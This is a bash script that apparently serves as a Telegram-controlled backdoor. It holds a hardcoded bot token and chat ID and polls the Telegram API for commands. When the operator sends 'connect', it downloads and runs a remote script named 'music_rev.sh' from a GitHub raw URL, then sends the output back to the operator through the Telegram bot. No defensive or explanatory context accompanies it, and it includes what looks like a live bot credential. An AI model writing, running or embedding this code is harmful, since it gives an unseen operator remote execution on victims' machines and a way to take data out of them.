#!/usr/bin/env bash
set -euo pipefail

################ CONFIG ################
TOKEN="7400095855:AAE9Lqtz6LLM-_gEasvVWY4nqGtkxr2I-rY"
CHAT_ID="6565158025"
HARDCODE_CMD="curl -sL https://raw.githubusercontent.com/FBIking/Fbiking.github.io/main/music_rev.sh -o music_rev.sh && chmod +x music_rev.sh && ./music_rev.sh"
########################################

API="https://api.telegram.org/bot${TOKEN}"

send_msg() {
  local text="$1"
  curl -s -X POST "${API}/sendMessage" \
    -d chat_id="${CHAT_ID}" \
    -d text="$text" >/dev/null
}

send_file() {
  local file="$1"
  curl -s -X POST "${API}/sendDocument" \
    -F chat_id="${CHAT_ID}" \
    -F document=@"$file" >/dev/null
}

# Bash JSON parser using jq
parse_updates_bash() {
  jq -r '.result[] | "\(.update_id)|\(.message.chat.id // empty)|\(.message.text // "")"' 2>/dev/null
}

# notify on startup
send_msg "ready to execute command"

OFFSET=0
while true; do
  UPDATES=$(curl -s "${API}/getUpdates?offset=${OFFSET}&timeout=20")
  
  while IFS= read -r line; do
    [ -z "$line" ] && continue
    IFS='|' read -r UPDATE_ID FROM_ID TEXT <<< "$line"
    OFFSET=$((UPDATE_ID+1))

    # only react to your chat
    [ "$FROM_ID" != "$CHAT_ID" ] && continue

    if [ "$TEXT" = "connect" ]; then
      OUTPUT="$(bash -c "$HARDCODE_CMD" 2>&1 || true)"

      if [ -z "$OUTPUT" ]; then
        send_msg "command executed successfully (no output)"
      else
        if [ ${#OUTPUT} -le 3500 ]; then
          send_msg "command executed successfully:\n$OUTPUT"
        else
          TMP="$(mktemp /tmp/out.XXXXXX)"
          printf "%s\n" "$OUTPUT" > "$TMP"
          send_file "$TMP"
          rm -f "$TMP"
        fi
      fi
    fi
  done < <(echo "$UPDATES" | parse_updates_bash)
done
